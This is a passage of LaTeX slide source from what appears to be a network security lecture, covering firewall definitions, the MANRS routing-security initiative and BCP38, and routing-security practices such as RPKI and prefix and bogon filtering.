      between networks using differing security postures.} Wack, J. et al (NIST), "Guidelines on Firewalls and Firewall Policy", Special Publication 800-41,
      January 2002.

      Tutorial: A firewall typically protects a smaller, secure network
      (such as a corporate LAN, or even just one host) from a larger
      network (such as the Internet). The firewall is installed at the
      point where the networks connect, and the firewall applies policy
      rules to control traffic that flows in and out of the protected
      network.
\end{quote}

\slide{Firewall -- Another definition}
% Remove?
\begin{quote}
\$ firewall, continued

      {\bf A firewall is not always a single computer.} For example, a
      firewall may consist of a pair of filtering routers and one or
      more proxy servers running on one or more bastion hosts, all
      connected to a small, dedicated LAN (see: buffer zone) between the
      two routers.

      The external router blocks attacks that use IP to
      break security (IP address spoofing, source routing, packet
      fragments), while proxy servers block attacks that would exploit a
      vulnerability in a higher-layer protocol or service. The internal
      router blocks traffic from leaving the protected network except
      through the proxy servers.

      The difficult part is defining criteria by which packets are denied passage through the firewall, because
      a firewall not only needs to keep unauthorized traffic (i.e., intruders) out, but usually also needs to let authorized traffic
      pass both in and out.
\end{quote}

\slide{Mutually Agreed Norms for Routing Security (MANRS)}

%\hlkimage{2cm}{MANRS_square.png}

\begin{quote}
  Mutually Agreed Norms for Routing Security (MANRS) is a global initiative, supported by the Internet Society, that provides crucial fixes to reduce the most common routing threats. 
\end{quote}
Source: {\small\link{https://www.manrs.org/wp-content/uploads/2018/09/MANRS_PDF_Sep2016.pdf}}

\begin{list2}
\item Problems related to incorrect routing information
\item Problems related to traffic with spoofed source IP addresses
\item Problems related to coordination and collaboration between network operators
\item Also BCP38 RFC2827 \emph{Network Ingress Filtering: Defeating Denial of Service Attacks
which employ IP Source Address Spoofing}
\end{list2}

You should all ask your internet providers if they know about MANRS, and follow it. We should ask our government and institutions to support and follow MANRS and good practices for network on the Internet


\slide{Routing Security}


\begin{list2}
\item Use MD5 passwords or better authentication for routing protocols {\myalert}
\item TTL Security -- avoid routed packets
\item Max prefix -- of course, only allow expected networks
\item Prefix filtering -- only parts of IPv6 space is used
\item TCP Authentication Option [RFC 5925] replaces TCP MD5 [RFC 2385]
\item Turn ON RPKI for both IPv4 and IPv6 prefixes, {\myalert} \\
\link{https://nlnetlabs.nl/projects/rpki/about/}
\item Drop bogons on IPv4 and IPv6, article with multiple references YMMV\\
\link{https://theinternetprotocolblog.wordpress.com/2020/01/15/some-notes-on-ipv6-bogon-filtering/}
\end{list2}







\end{document}
